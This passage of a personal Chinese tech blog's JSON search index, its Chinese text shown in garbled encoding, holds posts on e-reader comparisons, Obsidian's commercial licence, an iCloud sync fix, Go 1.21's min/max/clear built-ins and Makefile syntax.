æˆ‘ä¸‹å•äº†ä¸¤ä¸ªï¼Œè§‰å¾—å…ˆä½“éªŒä¸€ä¸‹ï¼Œç„¶ååœ¨é€€ä¸€ä¸ªã€‚\nç„¶è€Œç”¨äº†ä¸åˆ°ä¸¤å¤©ä¹‹åï¼Œæˆ‘è¿˜æ˜¯å†³å®šæŠŠä¸¤ä¸ªæœºå™¨éƒ½ç»™é€€äº†ï¼Œç»§ç»­ç”¨æˆ‘çš„kindle pw4ã€‚\né€‰æ‹©å› ç´  å°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œç”µå­ä¹¦æœ€ä¸ºé‡è¦çš„é€‰æ‹©å› ç´ æœ‰ä»¥ä¸‹ä¸‰ç‚¹ã€‚\næ˜¾ç¤ºæ•ˆæœ: è¯´å®åœ¨çš„ï¼Œç°åœ¨çš„ç”µå­ä¹¦åŸºæœ¬ä¸Šéƒ½æ˜¯carta1200ã€300ppiã€å†·æš–å…‰ã€‚åŸºæœ¬ä¸Šä»æ˜¾ç¤ºæ•ˆæœä¸Šæ¥è¯´ï¼Œå„å¤§å‚å®¶éƒ½æ˜¯åŠæ–¤å…«ä¸¤ã€‚å°±æˆ‘è‡ªå·±ä½“éªŒè€Œè¨€ï¼Œæˆ‘å¹¶æ²¡æœ‰å‘ç°æ±‰ç‹çš„æ˜¾ç¤ºæ•ˆæœå’Œæ–‡çŸ³leaf3æœ‰ä½•ä¸åŒã€‚ æ¡æŒæ‰‹æ„Ÿ: å¤–è§‚å½±å“æ¡æŒæ‰‹æ„Ÿï¼Œå¤–è§‚ä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯å°±æ˜¯å¹³æ¿è®¾è®¡ï¼Œåƒkindle paperwhiteç³»åˆ—ã€‚å¦ä¸€ç±»å°±æ˜¯ä¹¦è„Šå¼è®¾è®¡ï¼Œæ¡æŒæ›´èˆ’é€‚ï¼Œåƒkindle os3, æ±‰ç‹clear7ä¹‹ç±»çš„ã€‚ ç®€æ´ç³»ç»Ÿ: ç”µå­ä¹¦å¹¶ä¸æ˜¯æ‰‹æœºï¼Œä¸éœ€è¦å¤ªå¤šçš„åŠŸèƒ½ï¼ŒåŠŸèƒ½å¤ªå¤šåè€Œæˆä¸ºç´¯èµ˜ ç¨³å®šæ€§: ç‚¹å­äº§å“éš¾å…è¢«æ‘”ã€æˆ–è€…æ·‹æ°´ï¼Œå¯¹äºè¿™äº›æ„å¤–æƒ…å†µï¼Œå¦‚æœäº§å“éå¸¸è„†å¼±ï¼Œé‚£ä¹ˆå¾ˆå¤§å¯èƒ½ä¼šæŸå¤±å¤§ç¬”çš„é‡‘é¢ã€‚ ç»­èˆª æ–‡çŸ³çš„ç¼ºç‚¹ æ–‡çŸ³å’Œæ±‰ç‹çš„ä¸¤æ¬¾äº§å“ï¼Œæ‹¿åˆ°æ‰‹å¼€æœºä¸åˆ°ä¸€å°æ—¶ï¼Œæˆ‘å°±å†³å®šå…ˆé€€äº†æ–‡çŸ³ã€‚\nåŸå› æœ‰ä»¥ä¸‹å‡ ç‚¹\næ˜¾ç¤ºæ•ˆæœæ–‡çŸ³å’Œæ±‰ç‹å·®ä¸å¤šï¼Œæ²¡å•¥çªå‡ºäº®ç‚¹ æ¡æŒæ‰‹æ„Ÿæ–‡çŸ³è‚¯å®šæ¯”ä¸è¿‡æ±‰ç‹çš„ä¹¦è„Šå¼è®¾è®¡, å¹¶ä¸”æ±‰ç‹æ›´è½» æ–‡çŸ³çš„ç³»ç»Ÿå¤ªå¤æ‚ï¼Œè®¾ç½®å¤ªå¤šï¼Œç”šè‡³è¿˜æœ‰ä¸ªiphoneç±»ä¼¼çš„å°ç™½ç‚¹è®¾è®¡ï¼Œå°ç™½ç‚¹ç‚¹å‡»ä¹‹åå±•å¼€å¾ˆå¤šå›¾æ ‡ï¼Œæ¯ä¸ªå›¾æ ‡æˆ‘éƒ½ä¸çŸ¥é“åšä»€ä¹ˆçš„ æ‰ç”µé€Ÿåº¦ï¼Œæ–‡çŸ³çš„ç”µé‡è‚‰çœ¼å¯è§çš„åœ¨ä¸æ–­å‡å°‘ æ±‰ç‹çš„ç¼ºç‚¹ å¾®ä¿¡è¯»ä¹¦åŠŸèƒ½é˜‰å‰², è¿™ä¸æ˜¯æ±‰ç‹çš„é—®é¢˜ï¼Œè€Œæ˜¯å¾®ä¿¡è¯»ä¹¦è‡ªèº«çš„é—®é¢˜ã€‚ä¾‹å¦‚ä¹¦æ¶é¡µé¢ï¼Œä¹¦ç±åªæœ‰ä¸€ä¸ªæ’åºçš„é¡ºåºï¼Œå°±æ˜¯æŒ‰ç…§æœ€è¿‘é˜…è¯»çš„æ’åºã€‚è€Œæ— æ³•åƒiosæˆ–è€…å®‰å“appä¸€æ ·èƒ½å¤ŸæŒ‰ç…§é˜…è¯»è¿›åº¦æ’åºï¼Œå¦å¤–ä¹Ÿæ²¡æœ‰é˜…è¯»æ—¶é•¿åˆ†æçš„åŠŸèƒ½ã€‚ å¦å¤–æˆ‘ä¹Ÿæ³¨æ„åˆ°ï¼Œå¾®ä¿¡è¯»ä¹¦ç”µçº¸ä¹¦ç‰ˆï¼Œæ‰«ç ç™»å½•çš„æœ‰æ•ˆæœŸæ˜¯24å°æ—¶ï¼Œæˆ‘ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯æ„å‘³ç€24å°æ—¶ä¹‹åæˆ‘åˆè¦é‡æ–°æ‰«ç ã€‚\nè§¦æ„Ÿå…‰æ»‘ï¼Œæ±‰ç‹çš„èƒŒæ¿çš„è§¦æ„Ÿè®©äººæ„Ÿè§‰éå¸¸å…‰æ»‘ï¼Œæ„Ÿè§‰ç¨ä¸æ³¨æ„å°±ä¼šæ»‘ä¸‹å»çš„æ ·å­ã€‚å®Œå…¨æ²¡æœ‰kindle pw4é‚£ç§æ‹¿åœ¨æ‰‹æœºï¼Œå°±ç²˜åœ¨æ‰‹ä¸Šçš„æ„Ÿè§‰ã€‚æ‰€ä»¥æˆ‘è§‰å¾—ï¼Œä¹°æ±‰ç‹ï¼Œå°±å¿…é¡»è¦ä¹°ä¸€ä¸ªä¿æŠ¤å¥—ï¼Œä½†æ˜¯å®˜æ–¹å–çš„ä¿æŠ¤å¥—ä¹Ÿå¤ªè´µäº†å§ï¼Œå±…ç„¶è¦110å¤šå—ï¼Œè¿™ç‚¹æœ‰ç‚¹åƒå‰²éŸ­èœã€‚ä»€ä¹ˆä¿æŠ¤å¥—èƒ½å–é‚£ä¹ˆè´µï¼Œéƒ½å¿«èµ¶ä¸Šååˆ†ä¹‹ä¸€çš„ç”µçº¸ä¹¦çš„ä»·æ ¼äº†ã€‚\nè¯å…¸ç¼ºé™·ï¼Œæ±‰ç‹çš„è¯å…¸ä¹Ÿæ˜¯æˆ‘è¦åæ§½çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œåªèƒ½æŠŠå•è¯çš„åŸå‹åŠ å…¥åˆ°å•è¯æœ¬ï¼Œå•è¯æ¥ä¸ªå¤æ•°æˆ–è€…è¿‡å»åˆ†è¯ï¼Œå°±ä¸èƒ½åŠ å…¥å•è¯æœ¬äº†ã€‚kindleçš„ç”Ÿè¯æœ¬ï¼Œæ‰€æœ‰å•è¯ï¼Œæ— è®ºä»€ä¹ˆå½¢å¼éƒ½èƒ½åŠ å…¥å•è¯æœ¬ã€‚\næ‰ç”µé€Ÿåº¦, ä»æ˜¨æ™šäº”ç‚¹å¤šå¼€æœºï¼Œåˆ°ä»Šå¤©æ—©ä¸Šï¼ŒåŸºæœ¬ä¸Šæ²¡åˆ°ä¸€å¤©ï¼Œç”µæ± å·²ç»æ‰ç”µæ¥è¿‘40%äº†\nè‡ªåŠ¨å…³æœº, ä¸ºäº†çœç”µï¼Œæ±‰ç‹åœ¨2å°æ—¶ä¸ä½¿ç”¨åï¼Œä¼šè‡ªåŠ¨å…³æœºã€‚ç„¶è€Œè¿™ä¸ªå¼€æœºæ—¶é—´å°±æœ‰ç‚¹ä¹…ï¼Œä½ å¯è®¾æƒ³ä¸€ä¸‹ï¼Œæ¯å¤©æ—©ä¸Šï¼Œä½ æƒ³çœ‹ä¹¦çš„æ—¶å€™ï¼Œä½ éƒ½è¦ç­‰å‡ åç§’çš„å¼€æœºæ—¶é—´ï¼Œé‚£ä½ èƒ½å—å¾—äº†å—ï¼Ÿ\næŒ‰é’®åé¦ˆï¼Œæ¾æ¾å®å®, è§¦æ„Ÿæ²¡æœ‰ä¸€è‡´æ€§ä½“éªŒ\nç»“è®º ç›®å‰è€Œè¨€ï¼Œå›½äº§çš„ç”µçº¸ä¹¦ç³»ç»Ÿï¼Œé™¤äº†å¼€æ”¾çš„ç³»ç»Ÿä¹‹å¤–ï¼Œå…¶ä»–å„ä¸ªæ–¹é¢è¿˜æ˜¯å­˜åœ¨ä¸kindleæœ‰è¾ƒå¤§çš„å·®è·ã€‚\nå½“ç„¶ï¼Œå¦‚æœä½ ä»æœªä½¿ç”¨è¿‡kindleç³»åˆ—çš„äº§å“ï¼Œå›½äº§çš„ç”µçº¸ä¹¦è¿˜æ˜¯å€¼å¾—ä¹°çš„ã€‚","title":"å¦‚ä½•é€‰æ‹©ï¼Œæ±‰ç‹Clear7ä¸æ–‡çŸ³Leaf3"},{"content":"æˆ‘çœ‹è¿‡å¾ˆå¤šä»‹ç»obsidiançš„æ–‡ç« ï¼Œé™¤äº†å¤–è§‚æ¼‚äº®ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œæœ€ä¸ºç€é‡å‰è°ƒçš„å°±æ˜¯ä¸ªäººç”¨æˆ·å…è´¹äº†ã€‚\nå¯¹äºä¸ªäººç”¨æˆ·ï¼ŒçœŸçš„å…è´¹å—ï¼Ÿ è¿˜æ˜¯è¯´äººå®¶å¹¶ä¸æ˜¯å…è´¹ï¼Œåªæ˜¯æˆ‘ä»¬åœ¨ç™½å«–ç½¢äº†ã€‚\næˆ‘ä»¬çœ‹çœ‹å®˜ç½‘å…³äºå•†ä¸šä»˜è´¹çš„è¯¦ç»†è§£é‡Šï¼š\nObsidian å¯¹äºä¸ªäººæ˜¯å…è´¹çš„ã€‚ä½†æ˜¯ï¼Œå¯¹äºé‚£äº›æ‹¥æœ‰ä¸¤ååŠä»¥ä¸Šå‘˜å·¥çš„å…¬å¸æˆ–ç»„ç»‡ï¼Œä»¥å•†ä¸šç›®çš„ä½¿ç”¨ Obsidian çš„è¯ï¼Œåˆ™éœ€è¦è´­ä¹°å•†ç”¨è®¸å¯è¯ã€‚æ‰€è°“å•†ä¸šç›®çš„ï¼ŒæŒ‡çš„æ˜¯ä»»ä½•ä¸å·¥ä½œç›¸å…³çš„æ´»åŠ¨ï¼Œæ¯”å¦‚è®°å½•ä¼šè®®å†…å®¹ã€é¡¹ç›®ç¬”è®°ï¼Œæˆ–æ˜¯åˆ›å»ºç»„ç»‡ Wiki ç­‰ã€‚ä¸è¿™äº›æ´»åŠ¨ç›¸å…³çš„ç¬”è®°è®°å½•ã€æ–‡æ¡£ç®¡ç†ã€çŸ¥è¯†ç®¡ç†ç­‰éƒ½å¯ä»¥è§†ä¸ºä»¥å•†ç”¨ç›®çš„ä½¿ç”¨ Obsidianã€‚ \u0026ndash;å‚è€ƒå•†ç”¨è®¸å¯è¯\næ‰€ä»¥ï¼Œå¤§éƒ¨åˆ†äººï¼ŒåŒ…æ‹¬æˆ‘éƒ½æ˜¯å¬è¯ä¸€åŠï¼Œåªçœ‹å‰é¢ï¼Œä¸çœ‹åé¢çš„ä½†æ˜¯ã€‚\nå¯¹äºå¤§éƒ¨åˆ†ä¸Šç­æ—æ¥è¯´ï¼Œå¦‚æœä½ å†ç”¨obsidianï¼Œæˆ‘ä¸å¤ªç›¸ä¿¡ä½ ä»æ¥æ²¡æœ‰åœ¨obsidiané‡Œè®°å½•ä¸€äº›å·¥ä½œå†…å®¹ã€‚\nå¯¹æˆ‘ä¸ªäººæ¥è¯´ï¼Œè™½ç„¶æˆ‘çš„æœ‰å‡ ç™¾æ¡ç¬”è®°å’Œå·¥ä½œæ— å…³ã€‚ä½†æ˜¯ä¹Ÿå…ä¸äº†æœ‰ä¸€äº›æ˜¯å’Œå·¥ä½œæœ‰å…³çš„çš„ã€‚æ¯”å¦‚å¯¹äºæŸä¸ªçº¿ä¸Šé—®é¢˜çš„åˆ†æï¼Œæ¯”å¦‚è®°å½•äº†ä¸€äº›å·¥ä½œè´¦å·ä¿¡æ¯ç­‰ç­‰ã€‚\nåœ¨å…³äºå•†ä¸šä»˜è´¹çš„ä¾‹å­ä¸Šï¼Œå®˜æ–¹è¿˜ä¸¾å‡ºäº†è´´å¿ƒçš„ç»™å‡ºäº†æ —å­ã€‚\né—®é¢˜5ï¼šæˆ‘ä½¿ç”¨ Obsidian å‚¨å­˜æ‰€æœ‰çš„çŸ¥è¯†ï¼Œæ— è®ºæ˜¯ä¸ªäººçš„è¿˜æ˜¯å·¥ä½œ/ä¸“ä¸šç›¸å…³çš„ï¼ˆå› ä¸ºå¤ªéš¾åŒºåˆ†ï¼‰ï¼Œæˆ‘éœ€è¦è´­ä¹°å•†ç”¨è®¸å¯è¯å—ï¼Ÿ\nå›ç­”ï¼šå¦‚æœä½ çš„ç¬”è®°ä¸­æœ‰å†…å®¹ç›´æ¥ä¸å…¬å¸é¡¹ç›®ç›¸å…³ï¼Œå¹¶ä¸”è¯¥å…¬å¸æ‹¥æœ‰ä¸¤ååŠä»¥ä¸Šå‘˜å·¥ï¼Œé‚£ä¹ˆä½ éœ€è¦è´­ä¹°å•†ç”¨è®¸å¯è¯ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œå³ä½¿æ˜¯ä¸ªäººä½¿ç”¨ï¼Œå…è´¹çš„æ¡ä»¶ä¹Ÿæ˜¯æä¸ºè‹›åˆ»çš„ã€‚\nä½ çš„ç¬”è®°ä¸èƒ½åŒ…å«ä»»ä½•å•†ä¸šç›®çš„çš„ä¿¡æ¯ ä½ å¯ä»¥åŒ…å«å•†ä¸šç›®çš„çš„ä¿¡æ¯ï¼Œä½†å‰ææ˜¯ä½ çš„å…¬å¸åªæœ‰ä½ ä¸€ä¸ªäºº å‡å¦‚ä½ æ˜¯ä¸ªç”¨Obisiançš„ä¸Šç­æ—ï¼Œæˆ‘è§‰å¾—æå¤§çš„å¯èƒ½ä½ å¹¶ä¸ç¬¦åˆå…è´¹ç”¨æˆ·çš„æ¡ä»¶ã€‚\næˆ–è€…æœ‰ä¸€å¤©ï¼Œå½“ä½ å¤§å­¦æ¯•ä¸šäº†ï¼Œè¿›å…¥å·¥ä½œç¯å¢ƒï¼Œä½ å¦‚æœè¿˜ç»§ç»­ç”¨ä¹‹å‰çš„ä»“åº“ï¼Œé‚£ä½ ä¹Ÿä¸å†ç¬¦åˆå…è´¹ç”¨æˆ·çš„æ¡ä»¶ã€‚\næ‰€ä»¥è¯´ï¼Œä¸è¦å†é€¢äººå°±è¯´Obsidianæ˜¯å…è´¹çš„äº†ã€‚\nObsidianå¹¶ä¸å…è´¹ï¼Œåªæ˜¯æˆ‘ä»¬å¤§éƒ¨åˆ†äººéƒ½åœ¨ç™½å«–ç½¢äº†ã€‚\næˆ‘ä¹Ÿå¹¶ä¸æ˜¯ä¸æ„¿æ„èŠ±é’±ï¼Œå¦‚æœè¦ä»˜é’±çš„è¯ï¼Œæˆ‘æ›´æƒ³ä¹°typeoraã€‚\nå› ä¸ºtypeoraæ˜¯ä¹°æ–­æœºåˆ¶ï¼Œä¸€æ¬¡æ€§ä»˜è´¹89å…ƒï¼Œç»ˆèº«åŒ…ç”¨ï¼Œå…è´¹å‡çº§ï¼Œæœ€å¤šå¯ä»¥å†ä¸‰å°è®¾å¤‡ä¸Šä½¿ç”¨\nObsidianæ˜¯è®¢é˜…æœºåˆ¶ï¼Œæ¯å¹´å•†ä¸šä½¿ç”¨è¦50ç¾å…ƒï¼Œä¹Ÿå°±æ˜¯å°†è¿‘400äººæ°‘å¸ã€‚\n","permalink":"https://wdd.js.org/posts/2023/no-free-obsidian/","summary":"æˆ‘çœ‹è¿‡å¾ˆå¤šä»‹ç»obsidiançš„æ–‡ç« ï¼Œé™¤äº†å¤–è§‚æ¼‚äº®ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œæœ€ä¸ºç€é‡å‰è°ƒçš„å°±æ˜¯ä¸ªäººç”¨æˆ·å…è´¹äº†ã€‚\nå¯¹äºä¸ªäººç”¨æˆ·ï¼ŒçœŸçš„å…è´¹å—ï¼Ÿ è¿˜æ˜¯è¯´äººå®¶å¹¶ä¸æ˜¯å…è´¹ï¼Œåªæ˜¯æˆ‘ä»¬åœ¨ç™½å«–ç½¢äº†ã€‚\næˆ‘ä»¬çœ‹çœ‹å®˜ç½‘å…³äºå•†ä¸šä»˜è´¹çš„è¯¦ç»†è§£é‡Šï¼š\nObsidian å¯¹äºä¸ªäººæ˜¯å…è´¹çš„ã€‚ä½†æ˜¯ï¼Œå¯¹äºé‚£äº›æ‹¥æœ‰ä¸¤ååŠä»¥ä¸Šå‘˜å·¥çš„å…¬å¸æˆ–ç»„ç»‡ï¼Œä»¥å•†ä¸šç›®çš„ä½¿ç”¨ Obsidian çš„è¯ï¼Œåˆ™éœ€è¦è´­ä¹°å•†ç”¨è®¸å¯è¯ã€‚æ‰€è°“å•†ä¸šç›®çš„ï¼ŒæŒ‡çš„æ˜¯ä»»ä½•ä¸å·¥ä½œç›¸å…³çš„æ´»åŠ¨ï¼Œæ¯”å¦‚è®°å½•ä¼šè®®å†…å®¹ã€é¡¹ç›®ç¬”è®°ï¼Œæˆ–æ˜¯åˆ›å»ºç»„ç»‡ Wiki ç­‰ã€‚ä¸è¿™äº›æ´»åŠ¨ç›¸å…³çš„ç¬”è®°è®°å½•ã€æ–‡æ¡£ç®¡ç†ã€çŸ¥è¯†ç®¡ç†ç­‰éƒ½å¯ä»¥è§†ä¸ºä»¥å•†ç”¨ç›®çš„ä½¿ç”¨ Obsidianã€‚ \u0026ndash;å‚è€ƒå•†ç”¨è®¸å¯è¯\næ‰€ä»¥ï¼Œå¤§éƒ¨åˆ†äººï¼ŒåŒ…æ‹¬æˆ‘éƒ½æ˜¯å¬è¯ä¸€åŠï¼Œåªçœ‹å‰é¢ï¼Œä¸çœ‹åé¢çš„ä½†æ˜¯ã€‚\nå¯¹äºå¤§éƒ¨åˆ†ä¸Šç­æ—æ¥è¯´ï¼Œå¦‚æœä½ å†ç”¨obsidianï¼Œæˆ‘ä¸å¤ªç›¸ä¿¡ä½ ä»æ¥æ²¡æœ‰åœ¨obsidiané‡Œè®°å½•ä¸€äº›å·¥ä½œå†…å®¹ã€‚\nå¯¹æˆ‘ä¸ªäººæ¥è¯´ï¼Œè™½ç„¶æˆ‘çš„æœ‰å‡ ç™¾æ¡ç¬”è®°å’Œå·¥ä½œæ— å…³ã€‚ä½†æ˜¯ä¹Ÿå…ä¸äº†æœ‰ä¸€äº›æ˜¯å’Œå·¥ä½œæœ‰å…³çš„çš„ã€‚æ¯”å¦‚å¯¹äºæŸä¸ªçº¿ä¸Šé—®é¢˜çš„åˆ†æï¼Œæ¯”å¦‚è®°å½•äº†ä¸€äº›å·¥ä½œè´¦å·ä¿¡æ¯ç­‰ç­‰ã€‚\nåœ¨å…³äºå•†ä¸šä»˜è´¹çš„ä¾‹å­ä¸Šï¼Œå®˜æ–¹è¿˜ä¸¾å‡ºäº†è´´å¿ƒçš„ç»™å‡ºäº†æ —å­ã€‚\né—®é¢˜5ï¼šæˆ‘ä½¿ç”¨ Obsidian å‚¨å­˜æ‰€æœ‰çš„çŸ¥è¯†ï¼Œæ— è®ºæ˜¯ä¸ªäººçš„è¿˜æ˜¯å·¥ä½œ/ä¸“ä¸šç›¸å…³çš„ï¼ˆå› ä¸ºå¤ªéš¾åŒºåˆ†ï¼‰ï¼Œæˆ‘éœ€è¦è´­ä¹°å•†ç”¨è®¸å¯è¯å—ï¼Ÿ\nå›ç­”ï¼šå¦‚æœä½ çš„ç¬”è®°ä¸­æœ‰å†…å®¹ç›´æ¥ä¸å…¬å¸é¡¹ç›®ç›¸å…³ï¼Œå¹¶ä¸”è¯¥å…¬å¸æ‹¥æœ‰ä¸¤ååŠä»¥ä¸Šå‘˜å·¥ï¼Œé‚£ä¹ˆä½ éœ€è¦è´­ä¹°å•†ç”¨è®¸å¯è¯ã€‚\nç»¼ä¸Šæ‰€è¿°ï¼Œå³ä½¿æ˜¯ä¸ªäººä½¿ç”¨ï¼Œå…è´¹çš„æ¡ä»¶ä¹Ÿæ˜¯æä¸ºè‹›åˆ»çš„ã€‚\nä½ çš„ç¬”è®°ä¸èƒ½åŒ…å«ä»»ä½•å•†ä¸šç›®çš„çš„ä¿¡æ¯ ä½ å¯ä»¥åŒ…å«å•†ä¸šç›®çš„çš„ä¿¡æ¯ï¼Œä½†å‰ææ˜¯ä½ çš„å…¬å¸åªæœ‰ä½ ä¸€ä¸ªäºº å‡å¦‚ä½ æ˜¯ä¸ªç”¨Obisiançš„ä¸Šç­æ—ï¼Œæˆ‘è§‰å¾—æå¤§çš„å¯èƒ½ä½ å¹¶ä¸ç¬¦åˆå…è´¹ç”¨æˆ·çš„æ¡ä»¶ã€‚\næˆ–è€…æœ‰ä¸€å¤©ï¼Œå½“ä½ å¤§å­¦æ¯•ä¸šäº†ï¼Œè¿›å…¥å·¥ä½œç¯å¢ƒï¼Œä½ å¦‚æœè¿˜ç»§ç»­ç”¨ä¹‹å‰çš„ä»“åº“ï¼Œé‚£ä½ ä¹Ÿä¸å†ç¬¦åˆå…è´¹ç”¨æˆ·çš„æ¡ä»¶ã€‚\næ‰€ä»¥è¯´ï¼Œä¸è¦å†é€¢äººå°±è¯´Obsidianæ˜¯å…è´¹çš„äº†ã€‚\nObsidianå¹¶ä¸å…è´¹ï¼Œåªæ˜¯æˆ‘ä»¬å¤§éƒ¨åˆ†äººéƒ½åœ¨ç™½å«–ç½¢äº†ã€‚\næˆ‘ä¹Ÿå¹¶ä¸æ˜¯ä¸æ„¿æ„èŠ±é’±ï¼Œå¦‚æœè¦ä»˜é’±çš„è¯ï¼Œæˆ‘æ›´æƒ³ä¹°typeoraã€‚\nå› ä¸ºtypeoraæ˜¯ä¹°æ–­æœºåˆ¶ï¼Œä¸€æ¬¡æ€§ä»˜è´¹89å…ƒï¼Œç»ˆèº«åŒ…ç”¨ï¼Œå…è´¹å‡çº§ï¼Œæœ€å¤šå¯ä»¥å†ä¸‰å°è®¾å¤‡ä¸Šä½¿ç”¨\nObsidianæ˜¯è®¢é˜…æœºåˆ¶ï¼Œæ¯å¹´å•†ä¸šä½¿ç”¨è¦50ç¾å…ƒï¼Œä¹Ÿå°±æ˜¯å°†è¿‘400äººæ°‘å¸ã€‚","title":"æ²¡æœ‰å…è´¹çš„Obsidian"},{"content":"ç¯å¢ƒè¯´æ˜ MacBook Pro M2 ç³»ç»Ÿç‰ˆæœ¬ 13.4.1 ç½‘ç»œç¯å¢ƒä¸ºwifi æ“ä½œæ­¥éª¤ æˆ‘å¾€icloudçš„æ–‡ä»¶å¤¹ä¸‹ï¼Œç²˜è´´å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶çš„å†…å®¹æŒºå¤šçš„ï¼Œç„¶åfinderä¸Šæ˜¾ç¤ºicloudçš„çŠ¶æ€å°±ä¸€ç›´æ˜¯å¤„äºåŒæ­¥ä¸­äº†ã€‚\nç­‰äº†å¥½ä¹…ï¼ŒåŒæ­¥çš„è¿‡ç¨‹ä¼¼ä¹å¡ä½äº†ã€‚\nç½‘ä¸Šçœ‹äº†ä¸€äº›è§£å†³æ–¹æ¡ˆï¼Œä¼¼ä¹éƒ½æ²¡å•¥ä½œç”¨ã€‚\næˆ‘æƒ³èµ·æ¥ä»¥å‰çš„åŒæ ·çš„ä¸€æ¬¡å¡é¡¿åŒæ­¥çš„è§£å†³æ–¹æ¡ˆï¼šé‡å¯ç”µè„‘\näºæ˜¯ï¼Œæˆ‘é‡å¯äº†ä¸€æ¬¡ç”µè„‘ï¼Œå†æ¬¡å¼€æœºï¼Œæ‰“å¼€finder, icloudæ–‡ä»¶çŠ¶æ€éå¸¸å¿«åŒæ­¥å®Œäº†ã€‚\n","permalink":"https://wdd.js.org/posts/2023/macbook-icloud-sync-stuck/","summary":"ç¯å¢ƒè¯´æ˜ MacBook Pro M2 ç³»ç»Ÿç‰ˆæœ¬ 13.4.1 ç½‘ç»œç¯å¢ƒä¸ºwifi æ“ä½œæ­¥éª¤ æˆ‘å¾€icloudçš„æ–‡ä»¶å¤¹ä¸‹ï¼Œç²˜è´´å‡ ä¸ªæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶çš„å†…å®¹æŒºå¤šçš„ï¼Œç„¶åfinderä¸Šæ˜¾ç¤ºicloudçš„çŠ¶æ€å°±ä¸€ç›´æ˜¯å¤„äºåŒæ­¥ä¸­äº†ã€‚\nç­‰äº†å¥½ä¹…ï¼ŒåŒæ­¥çš„è¿‡ç¨‹ä¼¼ä¹å¡ä½äº†ã€‚\nç½‘ä¸Šçœ‹äº†ä¸€äº›è§£å†³æ–¹æ¡ˆï¼Œä¼¼ä¹éƒ½æ²¡å•¥ä½œç”¨ã€‚\næˆ‘æƒ³èµ·æ¥ä»¥å‰çš„åŒæ ·çš„ä¸€æ¬¡å¡é¡¿åŒæ­¥çš„è§£å†³æ–¹æ¡ˆï¼šé‡å¯ç”µè„‘\näºæ˜¯ï¼Œæˆ‘é‡å¯äº†ä¸€æ¬¡ç”µè„‘ï¼Œå†æ¬¡å¼€æœºï¼Œæ‰“å¼€finder, icloudæ–‡ä»¶çŠ¶æ€éå¸¸å¿«åŒæ­¥å®Œäº†ã€‚","title":"MacBook icloud åŒæ­¥å¡æ­»ï¼Œ è¯·å°è¯•é‡å¯ç”µè„‘"},{"content":"golangæ¯éš”6ä¸ªæœˆå‘å¸ƒä¸€ä¸ªæ–°çš„æ¬¡ç‰ˆæœ¬å·å‡çº§ã€‚ä¸€èˆ¬æ˜¯æ˜¯2æœˆä¸€ä¸ªç‰ˆæœ¬ï¼Œ8æœˆä¸€ä¸ªç‰ˆæœ¬\nè¯­è¨€å±‚é¢ å¢åŠ å†…ç½®å‡½æ•° min() max() å‚è€ƒ https://tip.golang.org/ref/spec#Min_and_max\nThe built-in functions min and max compute the smallestâ€”or largest, respectivelyâ€”value of a fixed number of arguments of ordered types. There must be at least one argument.\nThe same type rules as for operators apply: for ordered arguments x and y, min(x, y) is valid if x + y is valid, and the type of min(x, y) is the type of x + y (and similarly for max). If all arguments are constant, the result is constant.\nvar x, y int m := min(x) // m == x m := min(x, y) // m is the smaller of x and y m := max(x, y, 10) // m is the larger of x and y but at least 10 c := max(1, 2.0, 10) // c == 10.0 (floating-point kind) f := max(0, float32(x)) // type of f is float32 var s []string _ = min(s...) // invalid: slice arguments are not permitted t := max(\u0026#34;\u0026#34;, \u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;) // t == \u0026#34;foo\u0026#34; (string kind) For numeric arguments, assuming all NaNs are equal, min and max are commutative and associative:\nmin(x, y) == min(y, x) min(x, y, z) == min(min(x, y), z) == min(x, min(y, z)) For floating-point arguments negative zero, NaN, and infinity the following rules apply:\nx y min(x, y) max(x, y) -0.0 0.0 -0.0 0.0 // negative zero is smaller than (non-negative) zero -Inf y -Inf y // negative infinity is smaller than any other number +Inf y y +Inf // positive infinity is larger than any other number NaN y NaN NaN // if any argument is a NaN, the result is a NaN For string arguments the result for min is the first argument with the smallest (or for max, largest) value, compared lexically byte-wise:\nmin(x, y) == if x \u0026lt;= y then x else y min(x, y, z) == min(min(x, y), z) clear() https://tip.golang.org/ref/spec#Clear\nThe built-in function clear takes an argument of map, slice, or type parameter type, and deletes or zeroes out all elements.\nCall Argument type Result clear(m) map[K]T deletes all entries, resulting in an empty map (len(m) == 0) clear(s) []T sets all elements up to the length of s to the zero value of T clear(t) type parameter see below If the type of the argument to clear is a type parameter, all types in its type set must be maps or slices, and clear performs the operation corresponding to the actual type argument.\nIf the map or slice is nil, clear is a no-op.\nå‚è€ƒ https://go.dev/doc/go1.21# ","permalink":"https://wdd.js.org/golang/go1.21/","summary":"golangæ¯éš”6ä¸ªæœˆå‘å¸ƒä¸€ä¸ªæ–°çš„æ¬¡ç‰ˆæœ¬å·å‡çº§ã€‚ä¸€èˆ¬æ˜¯æ˜¯2æœˆä¸€ä¸ªç‰ˆæœ¬ï¼Œ8æœˆä¸€ä¸ªç‰ˆæœ¬\nè¯­è¨€å±‚é¢ å¢åŠ å†…ç½®å‡½æ•° min() max() å‚è€ƒ https://tip.golang.org/ref/spec#Min_and_max\nThe built-in functions min and max compute the smallestâ€”or largest, respectivelyâ€”value of a fixed number of arguments of ordered types. There must be at least one argument.\nThe same type rules as for operators apply: for ordered arguments x and y, min(x, y) is valid if x + y is valid, and the type of min(x, y) is the type of x + y (and similarly for max).","title":"Go1.21å‘å¸ƒ"},{"content":"è¯­æ³• targets: prerequisites command command command targetsæ˜¯æ–‡ä»¶åï¼Œå¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€å¤šä¸ªæ–‡ä»¶åï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåªæœ‰ä¸€ä¸ª commandæ˜¯ä¸€ç³»åˆ—çš„æŒ‡ä»¤ï¼Œå¯ä»¥å¤šè¡Œåˆ†å¼€ prerequisitesæ˜¯ä¾èµ–é¡¹ç›®ï¼Œå¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€å¤šä¸ª å‚è€ƒ https://makefiletutorial.com/#makefile-cookbook ","permalink":"https://wdd.js.org/makefile/tutorial/","summary":"è¯­æ³• targets: prerequisites command command command 